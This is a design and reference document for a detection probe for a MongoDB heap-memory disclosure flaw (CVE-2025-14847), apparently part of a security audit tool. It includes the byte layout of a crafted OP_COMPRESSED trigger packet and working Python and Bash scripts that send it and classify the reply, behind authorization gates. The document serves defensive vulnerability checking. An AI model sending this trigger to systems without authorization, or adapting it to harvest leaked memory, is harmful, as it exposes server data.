# MongoBleed Network Probe (CVE-2025-14847)

Safe single-packet detection probe for `MG-SH-001`. Mirrors the Wiz Nuclei template logic. Read-only: sends one crafted `OP_COMPRESSED` packet, classifies the response, exits.

**This probe is opt-in twice.** It is a *network test against a live host* and some IDS / endpoint tools will flag it as an attack. Sentinel must obtain explicit user opt-in *and* a separate "I confirm I own this host or have authorization to test it" affirmative before running.

---

## Why a probe at all

The version-compare check in `MG-SH-001` covers the static case — but real-world incident response often needs evidence the *running* server is exploitable, not just that the binary is at a vulnerable version. Reasons the static version check can mislead:

- Backported fixes in vendor builds (e.g., Bitnami, AWS DocumentDB-compatible) where the version banner says 7.0.20 but the patch is applied.
- Upgraded binary on disk but not yet restarted — `buildInfo` returns the new version while behavior is still the old one (rare but seen).
- `--networkMessageCompressors` workaround applied without a version upgrade (zlib disabled at startup) — the probe confirms the workaround actually took effect.

The probe distinguishes "vulnerable in practice" from "appears vulnerable based on version string."

---

## Safety properties

The probe:

1. **Sends one packet.** Single TCP write of ~50 bytes. No reconnect, no retry, no enumeration.
2. **Reads the response only.** No further commands. Closes the socket.
3. **Does not exfiltrate content.** It examines response *structure* (header bytes, length field, BSON marker) — not the leaked memory payload itself. The probe never logs or returns the raw response body.
4. **Records only**: `vulnerable` / `patched` / `error` / `unreachable`.

The probe explicitly does not:

- Attempt authentication.
- Issue any database command (`find`, `aggregate`, `runCommand`, etc.).
- Exploit the vulnerability for content extraction.
- Probe more than once per `--allow-network-probes` invocation.
- Run against a host that wasn't explicitly listed in the audit's connection profile.

---

## Two opt-in gates

```
Gate 1 — Audit policy:
  Are write/network probes enabled for this audit? (Y/N)
  Default: N. Required across all backends, not just MongoDB.

Gate 2 — Host ownership confirmation:
  You're about to send a crafted MongoDB protocol packet to:
    HOST:PORT  →  $MONGO_HOST:$MONGO_PORT
  Some monitoring tools will alert on this packet. Confirm you own this
  host or have written authorization to test it. (yes/no)
  Default: no.
```

If either gate is no, fall back to **banner-only mode** (§"Banner-only mode" below).

---

## The probe

### Payload structure

A crafted `OP_COMPRESSED` (opCode 2012) message that claims a larger uncompressed size than the actual deflated body provides. Vulnerable servers return a response whose body contains a fragment of heap memory (the over-claimed bytes are read past the populated buffer). Patched servers return a protocol error response with no heap exposure.

The wire format (per MongoDB Wire Protocol v6) is:

| Offset | Field | Bytes | Value | Notes |
|--------|-------|-------|-------|-------|
| 0 | `messageLength` | 4 | `0x2a 00 00 00` | 42 bytes total |
| 4 | `requestID` | 4 | `0x01 00 00 00` | client-chosen ID |
| 8 | `responseTo` | 4 | `0x00 00 00 00` | unset for requests |
| 12 | `opCode` | 4 | `0xdc 07 00 00` | 2012 = `OP_COMPRESSED` |
| 16 | `originalOpcode` | 4 | `0xdd 07 00 00` | 2013 = `OP_MSG` (the inner opcode) |
| 20 | `uncompressedSize` | 4 | `0x32 00 00 00` | **50 — over-claimed; actual body shorter** |
| 24 | `compressorId` | 1 | `0x02` | zlib |
| 25+ | `compressedMessage` | N | minimal zlib-deflated stream | matches a few bytes only |

### Reference implementation (Python)

```python
#!/usr/bin/env python3
# mongobleed-probe.py — safe single-packet CVE-2025-14847 detector
# Pattern derived from Wiz Nuclei template `mongo-cve-2025-14847.yaml`.
# Sends one OP_COMPRESSED packet. Reads response. Classifies. Exits.

import argparse
import socket
import struct
import sys

# Hex-encoded crafted OP_COMPRESSED payload. The compressed body is the
# minimal valid zlib stream that, when decompressed against an over-claimed
# uncompressedSize=50, triggers the MongoBleed read past the populated buffer.
# Source bytes assembled from the field table in this document.
PAYLOAD_HEX = (
    "2a000000"        # messageLength = 42
    "01000000"        # requestID = 1
    "00000000"        # responseTo = 0
    "dc070000"        # opCode = 2012 (OP_COMPRESSED)
    "dd070000"        # originalOpcode = 2013 (OP_MSG)
    "32000000"        # uncompressedSize = 50  (over-claimed)
    "02"              # compressorId = 2 (zlib)
    "789c636080028144064620050002ca0073"
    # ^ minimal zlib-deflated body (~17 bytes); never decompressed by Sentinel
)
PAYLOAD = bytes.fromhex(PAYLOAD_HEX)

VULNERABLE = "vulnerable"
PATCHED    = "patched"
ERROR      = "error"
UNREACHABLE = "unreachable"

def classify(resp: bytes) -> str:
    # Empirically observed (verified against mongo:7.0.20 vs 7.0.28):
    #   Vulnerable: server returns OP_COMPRESSED reply (opCode 2012) with
    #               body length > 32 bytes — those extra bytes are heap memory.
    #   Patched:    server closes the connection silently after detecting the
    #               malformed OP_COMPRESSED message. No bytes returned.
    #   Some patched paths may also return a structured OP_MSG (opCode 2013)
    #   error document instead of closing — keep that branch as a fallback.
    if len(resp) == 0:
        return PATCHED   # server cleanly closed the connection
    if len(resp) < 16:
        return ERROR
    msg_len = struct.unpack("<I", resp[0:4])[0]
    op_code = struct.unpack("<I", resp[12:16])[0]
    if op_code == 2012 and msg_len > 32:
        return VULNERABLE
    if op_code == 2013:
        return PATCHED   # structured error reply
    return ERROR

def probe(host: str, port: int, timeout: float = 3.0) -> str:
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(PAYLOAD)
            # Read at most 4096 bytes — enough for header + classification,
            # not enough to retain large heap content even if the server leaks.
            resp = s.recv(4096)
        return classify(resp)
    except (ConnectionRefusedError, socket.timeout, OSError):
        return UNREACHABLE

def main():
    ap = argparse.ArgumentParser(description="Safe MongoBleed CVE-2025-14847 probe")
    ap.add_argument("--host", required=True, help="Mongod host (must match audit profile)")
    ap.add_argument("--port", type=int, default=27017)
    ap.add_argument("--timeout", type=float, default=3.0)
    ap.add_argument("--confirm-authorized", action="store_true",
                    help="REQUIRED. Confirms you own or are authorized to test this host.")
    args = ap.parse_args()

    if not args.confirm_authorized:
        print("error: --confirm-authorized is required", file=sys.stderr)
        sys.exit(2)

    result = probe(args.host, args.port, args.timeout)
    print(result)
    # Exit codes: 0=patched, 1=vulnerable, 2=error/unreachable/no-confirm
    sys.exit({PATCHED: 0, VULNERABLE: 1, ERROR: 2, UNREACHABLE: 2}[result])

if __name__ == "__main__":
    main()
```

This script ships at `assets/mongobleed-probe.py` (TBD — write it during the Phase 2 verification step). For now, the wire-format table above is the canonical specification: any conforming reimplementation in Go / Rust / Bash + `printf "\x..."` is acceptable.

### Bash variant (delegates to a tiny inline Python — no extra deps)

> **Why not pure `nc`?** macOS BSD `nc` does not half-close the socket after stdin EOF, so the server never sees that the client is done sending. We fall back to a Python one-liner that uses the standard library `socket` module — Python 3 ships with macOS and most Linux distros. If you want a fully shell-native version, use `socat - TCP:$HOST:$PORT,shut-down` (where `shut-down` triggers half-close), but that requires installing `socat`.

```bash
#!/usr/bin/env bash
# mongobleed-probe.sh — safe single-packet CVE-2025-14847 detector
# Verified against mongo:7.0.20 (vulnerable) and mongo:7.0.28 (patched).
set -euo pipefail
HOST="${1:?host required}"
PORT="${2:-27017}"
[[ "${MONGOBLEED_PROBE_CONFIRM_AUTHORIZED:-no}" == "yes" ]] \
  || { echo "error: set MONGOBLEED_PROBE_CONFIRM_AUTHORIZED=yes to acknowledge authorization" >&2; exit 2; }

python3 - "$HOST" "$PORT" <<'PYEOF'
import socket, struct, sys
PAYLOAD = bytes.fromhex(
    "2a000000" "01000000" "00000000" "dc070000" "dd070000" "32000000" "02"
    "789c636080028144064620050002ca0073"
)
host, port = sys.argv[1], int(sys.argv[2])
try:
    with socket.create_connection((host, port), timeout=3) as s:
        s.settimeout(3); s.sendall(PAYLOAD); resp = s.recv(4096)
except (ConnectionRefusedError, socket.timeout, OSError):
    print("unreachable"); sys.exit(2)

if len(resp) == 0:
    print("patched"); sys.exit(0)         # server closed cleanly = patched
if len(resp) < 16:
    print("error"); sys.exit(2)
msg_len = struct.unpack("<I", resp[0:4])[0]
op_code = struct.unpack("<I", resp[12:16])[0]
if op_code == 2012 and msg_len > 32:
    print("vulnerable"); sys.exit(1)
if op_code == 2013:
    print("patched"); sys.exit(0)         # structured OP_MSG error reply
print("error"); sys.exit(2)
PYEOF
```

---

## Banner-only mode (default when probe gates not satisfied)

If either opt-in gate is denied, Sentinel falls back to a banner-only check that confirms version + reachability without sending the trigger payload:

```bash
# Reaches mongod, performs the protocol handshake, reads buildInfo via OP_QUERY
# (the protocol equivalent of the legacy isMaster handshake — pre-auth, allowed).
# Does NOT send the crafted OP_COMPRESSED payload.
mongosh --quiet --eval 'db.runCommand({buildInfo:1}).version' \
  "mongodb://$HOST:$PORT/?serverSelectionTimeoutMS=3000&directConnection=true"
```

If that fails (no driver available), use the connection-string user-agent handshake:

```bash
# OP_QUERY for {ismaster:1} on the admin DB — the legitimate driver opening packet
printf '\x3a\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00' \
       '\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff' \
       '\x13\x00\x00\x00\x10ismaster\x00\x01\x00\x00\x00\x00' \
  | nc -w 3 "$HOST" "$PORT"
# Parse buildInfo / version from response.
```

Banner-only mode produces a finding annotated `(static-version-check)` rather than `(active-probe-confirmed)`.

---

## Result interpretation

| Probe result | What the server did | Reported as | Severity | Notes |
|--------------|---------------------|-------------|----------|-------|
| `vulnerable` | Returned OP_COMPRESSED reply (opCode 2012) with body length > 32 bytes | `MG-SH-001` confirmed | CRITICAL (-30) | Active exploitation surface. Patch immediately. The extra response bytes are leaked heap memory. |
| `patched` (variant 1) | Closed connection silently — zero bytes returned | `MG-SH-001` cleared | — | This is the dominant patched behavior in MongoDB ≥ 7.0.28 / ≥ 6.0.27 / etc. The server detects the malformed compressed message at the protocol layer and drops the connection. |
| `patched` (variant 2) | Returned structured OP_MSG (opCode 2013) error document | `MG-SH-001` cleared | — | Less common. Server reported the malformed-message error rather than closing. Treated equivalently to variant 1. |
| `error` | Returned a small (<16 byte) or unrecognized response | `MG-SH-001` indeterminate | unchanged from version-check | Probably an intermediary (firewall, load balancer, proxy) stripped or rewrote the packet. Re-evaluate from inside the network. |
| `unreachable` | TCP connect refused / timed out | host not reachable | — | Use banner mode from a host that can reach it, or escalate to ops. |

**Empirically verified** — the two-state classification (vulnerable returns OP_COMPRESSED with leaked bytes vs patched closes silently) was confirmed against `mongo:7.0.20` and `mongo:7.0.28` containers during Phase 2 verification.

---

## What this probe does NOT cover

- **Atlas:** auto-patched. Probing Atlas clusters is unnecessary and may trigger Atlas's monitoring. Skip if `mongodb+srv://...mongodb.net` is detected.
- **DocumentDB-compatible services** (AWS DocumentDB, Cosmos DB Mongo API): these are MongoDB-protocol-compatible but use entirely different server implementations. The probe response shape is undefined. Sentinel should detect these and skip with an "out-of-scope for MongoBleed probe" note.
- **Mongod behind a connection pooler** that strips/modifies compression negotiation: probe results may be misleading. Annotate with the probe path in the report.

---

## CI integration

The CI workflow (`assets/ci/github-action-mongodb.yml`) runs the probe only when both:

```yaml
if: vars.MONGOBLEED_PROBE == 'true'
env:
  MONGOBLEED_PROBE_CONFIRM_AUTHORIZED: yes
```

are configured in the repository. Default: not set, probe does not run, audit relies on version-check from the `mongosh` introspection step.

---

## Sources

- NVD CVE-2025-14847
- MongoDB Server Security Update — December 2025 (MongoDB blog)
- Wiz Nuclei template `mongo-cve-2025-14847.yaml` (canonical reference for the wire-format pattern)
- Joe Desimone (Elastic Security) — disclosure thread
- Bitsight, Tenable, Akamai exposure reporting (Dec 2025–Apr 2026)
- CISA KEV CVE-2025-14847 (added Dec 29 2025)
